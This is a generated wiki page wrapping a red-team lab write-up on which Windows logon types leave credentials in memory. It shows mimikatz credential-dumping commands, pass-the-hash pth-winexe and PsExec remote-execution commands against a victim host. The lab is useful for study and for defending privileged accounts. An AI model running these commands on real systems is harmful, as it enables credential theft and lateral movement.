---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Network vs Interactive Logons

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-network-vs-interactive-logons` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Network vs Interactive Logons](../../topics/offensive-security/network-vs-interactive-logons.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-network-vs-interactive-logons |
| name | Network vs Interactive Logons |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons.md |

## Preserved Source Material

````yaml
_asset_filenames:
- pwdum-test5.png
- pwdump-logon10.png
- pwdump-psexec-eventlog.png
- pwdump-psexec-interactive-logon.png
- pwdump-psexec-no-atlernate-credentials.png
- pwdump-psexec-supplied-creds.png
- pwdump-runas-netonly-dump.png
- pwdump-runas-netonly.png
- pwdump-test1.png
- pwdump-test2.png
- pwdump-test3.png
- pwdump-test6.png
_body: "---\ndescription: >-\n  This lab explores/compares when credentials are susceptible to credential\n  dumping.\n---\n\
  \n# Network vs Interactive Logons\n\nTested against Microsoft Windows 7 Professional 6.1.7601 Service Pack 1 Build 7601\n\
  \n## Interactive Logon \\(2\\): Initial Logon\n\nLet's make a base password dump using mimikatz on the victim system to\
  \ see what we can get before we start logging on to it using other methods such as runas, psexec, etc. To test this, the\
  \ victim system was rebooted and no other attempts to login to the system were made except for the interactive logon to\
  \ get access to the console:\n\n{% code title=\"attacker@victim\" %}\n```csharp\nmimikatz # privilege::debug\nmimikatz #\
  \ sekurlsa::logonpasswords\n```\n{% endcode %}\n\nCredentials were cached and got dumped by mimikatz:\n\n![](../../.gitbook/assets/pwdump-test1.png)\n\
  \n## Interactive Logon \\(2\\) via runas and Local Account\n\n{% code title=\"responder@victim\" %}\n```csharp\nrunas /user:low\
  \ cmd\n```\n{% endcode %}\n\n{% code title=\"attacker@victim\" %}\n```csharp\nmimikatz # sekurlsa::logonpasswords\n```\n\
  {% endcode %}\n\nCredentials were cached and got dumped by mimikatz:\n\n![](../../.gitbook/assets/pwdump-test2.png)\n\n\
  ## Interactive Logon \\(2\\) via runas and Domain Account\n\n{% code title=\"responder@victim\" %}\n```csharp\nrunas /user:spot@offense\
  \ cmd\n```\n{% endcode %}\n\n{% code title=\"attacker@victim\" %}\n```csharp\nmimikatz # sekurlsa::logonpasswords\n```\n\
  {% endcode %}\n\nCredentials were cached and got dumped by mimikatz:\n\n![](../../.gitbook/assets/pwdump-test3.png)\n\n\
  ## New Credentials \\(9\\) via runas with /netonly\n\n```csharp\nrunas /user:low /netonly cmd\n```\n\nNote that event logs\
  \ show the logon of type 9 for the user `mantvydas`, although we requested to logon as the user `low`:\n\n![](../../.gitbook/assets/pwdump-runas-netonly.png)\n\
  \nLogon type 9 means that the any network connections originating from our new process will use the new credentials, which\
  \ in our case are credentials of the user `low`. These credentials, get cached:\n\n![](../../.gitbook/assets/pwdump-runas-netonly-dump.png)\n\
  \n## Network Logon \\(3\\) with Local Account\n\nImagine an Incident Responder is connecting to a victim system using that\
  \ machine's local account remotely to inspect it for a compromise using pth-winexe:\n\n{% code title=\"responder@victim\"\
  \ %}\n```csharp\nroot@~# pth-winexe //10.0.0.2 -U back%password cmd\n```\n{% endcode %}\n\n{% code title=\"attacker@victim\"\
  \ %}\n```text\nsekurlsa::logonpasswords\n```\n{% endcode %}\n\nMimikatz shows no credentials got stored in memory for the\
  \ user `back`.\n\n## Network Logon \\(3\\) with Domain Account\n\nImagine an Incident Responder is connecting to a victim\
  \ system using a privileged domain account remotely to inspect it for a compromise using pth-winexe, a simple SMB mount\
  \ or WMI:\n\n{% code title=\"responder@victim\" %}\n```csharp\nroot@~# pth-winexe //10.0.0.2 -U offense/spot%password cmd\n\
  ```\n{% endcode %}\n\n{% code title=\"responder@victim\" %}\n```text\nPS C:\\Users\\spot> net use * \\\\10.0.0.2\\test /user:offense\\\
  spotless spotless\nDrive Z: is now connected to \\\\10.0.0.2\\test.\n\nThe command completed successfully.\n\nPS C:\\Users\\\
  spot> wmic /node:10.0.0.2 /user:offense\\administrator process call create calc\nEnter the password :********\n\nExecuting\
  \ (Win32_Process)->Create()\nMethod execution successful.\n```\n{% endcode %}\n\n{% code title=\"attacker@victim\" %}\n\
  ```text\nsekurlsa::logonpasswords\n```\n{% endcode %}\n\nMimikatz shows no credentials got stored in memory for `offense\\\
  spotless` or `offense\\administrator`.\n\n## Network Interactive Logon \\(10\\) with Domain Account\n\nRDPing to the victim\
  \ system:\n\n![](../../.gitbook/assets/pwdum-test5.png)\n\nCredentials were cached and got dumped by mimikatz:\n\n![](../../.gitbook/assets/pwdump-test6.png)\n\
  \nNote that any remote logon with a graphical UI is logged as logon event type 10 and the credentials stay on the logged\
  \ on system:\n\n![](../../.gitbook/assets/pwdump-logon10.png)\n\n## PsExec From An Elevated Prompt\n\n{% code title=\"responder@victim\"\
  \ %}\n```csharp\n.\\PsExec64.exe \\\\10.0.0.2 cmd\n\nPsExec v2.2 - Execute processes remotely\nCopyright (C) 2001-2016 Mark\
  \ Russinovich\nSysinternals - www.sysinternals.com\n\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft\
  \ Corporation.  All rights reserved.\n\nC:\\Windows\\system32>\n```\n{% endcode %}\n\n![](../../.gitbook/assets/pwdump-psexec-no-atlernate-credentials.png)\n\
  \nMimikatz shows no credentials got stored in memory for `offense\\spot`\n\nNote how all the logon events are of type 3\
  \ - network logons and read on to the next section.\n\n## PsExec + Alternate Credentials\n\n{% code title=\"responder@victim\"\
  \ %}\n```csharp\n.\\PsExec64.exe \\\\10.0.0.2 -u offense\\spot -p password cmd\n```\n{% endcode %}\n\nCredentials were cached\
  \ and got dumped by mimikatz:\n\n![](../../.gitbook/assets/pwdump-psexec-supplied-creds.png)\n\nLooking at the event logs,\
  \ a logon type 2 \\(interactive\\) is observed amongst the network logon 3, which explains why credentials were successfully\
  \ dumped in the above test:\n\n![](../../.gitbook/assets/pwdump-psexec-interactive-logon.png)\n\n![](../../.gitbook/assets/pwdump-psexec-eventlog.png)\n\
  \n## Observations\n\nNetwork logons do not get cached in memory except for when using `PsExec` with alternate credentials\
  \ specified via the `-u` switch. \n\nInteractive and remote interactive logons do get cached and can get easily dumped with\
  \ Mimikatz.\n\n## References\n\n{% embed url=\"https://digital-forensics.sans.org/blog/2012/02/21/protecting-privileged-domain-account-safeguarding-password-hashes\"\
  \ %}"
_relative_path: offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons.md
````
